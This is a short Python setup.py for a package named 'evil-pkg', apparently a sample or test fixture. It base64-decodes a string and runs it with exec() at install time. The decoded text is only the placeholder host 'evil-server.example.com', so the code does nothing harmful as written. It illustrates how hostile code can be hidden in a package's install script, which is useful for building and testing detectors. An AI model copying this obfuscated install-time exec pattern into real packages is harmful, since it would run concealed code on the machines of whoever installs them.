import base64

from setuptools import setup

PAYLOAD = base64.b64decode("ZXZpbC1zZXJ2ZXIuZXhhbXBsZS5jb20=")

exec(PAYLOAD)

setup(name="evil-pkg", version="1.0.0")
